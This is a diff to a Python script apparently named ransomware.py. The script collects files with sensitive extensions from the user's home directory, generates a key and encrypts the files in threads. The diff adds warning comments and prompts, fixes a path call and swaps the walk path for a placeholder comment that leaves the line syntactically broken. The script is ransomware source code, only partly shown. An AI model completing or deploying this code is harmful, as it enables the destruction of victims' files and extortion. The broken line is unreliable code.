@@ -1,3 +1,5 @@
+# Never run this code on your computer or any computer before reviewing the code.
+
 import os
 import random
 import threading
@@ -22,11 +24,11 @@ sensitive_extensions = [
 
 def get_files(encryption=True):
     """Collects files to encrypt or decrypt."""
-    path = os.path.expanduser(~)
+    path = os.path.expanduser("~")
     print(path)
     global list_of_files
     list_of_files.clear()
-    for root, dirs, files in os.walk(path):
+    for root, dirs, files in os.walk(#set your own path here):
         for file in files:
             full_path = os.path.join(root, file)
             if file.lower() == "ransomware.py":
@@ -124,9 +126,9 @@ def intro():
 # --- Program Execution ---
 generate_key()
 get_files(encryption=True)
-input("Attention")
-input("Attention")
-input("Attention")
-input("Attention")
+input("Attention risk of encrypting your files")
+input("Attention risk of encrypting your files")
+input("Attention risk of encrypting your files")
+input("Attention risk of encrypting your files")
 run_in_threads(encrypt_file)
 intro()
